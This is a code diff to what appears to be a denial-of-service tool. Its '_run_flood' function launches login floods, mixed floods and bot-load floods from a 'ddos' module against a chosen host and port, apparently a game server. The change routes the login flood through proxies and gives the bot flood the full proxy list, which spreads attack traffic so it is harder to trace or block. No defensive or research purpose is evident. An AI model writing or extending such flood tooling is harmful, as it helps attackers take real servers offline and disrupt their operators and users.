@@ -215,7 +215,8 @@ async def _run_flood(args, mode):
         elif mode == "login":
             await ddos.login_ddos(args.host, args.port, version, workers=args.workers,
                                   stop=lambda: stop["flag"], stats=stats, log=log,
-                                  signed=args.signed, share_key=args.share_key)
+                                  signed=args.signed, share_key=args.share_key,
+                                  proxies=proxies)
         elif mode == "mixed":
             pool = await ddos.mixed_ddos(args.host, args.port, version,
                                          workers=args.workers, bot_count=args.bott,
@@ -223,7 +224,7 @@ async def _run_flood(args, mode):
                                          signed=args.signed, share_key=args.share_key)
         elif mode == "bot":
             pool = ddos.bot_load(args.host, args.port, version, count=args.bott,
-                                 proxy=proxies[0] if proxies else None,
+                                 proxy=proxies if proxies else None,
                                  online=args.online, chat_every=args.chat_every, log=log,
                                  signed=args.signed, share_key=args.share_key,
                                  offline_uuid=True if args.offline_uuid else None)
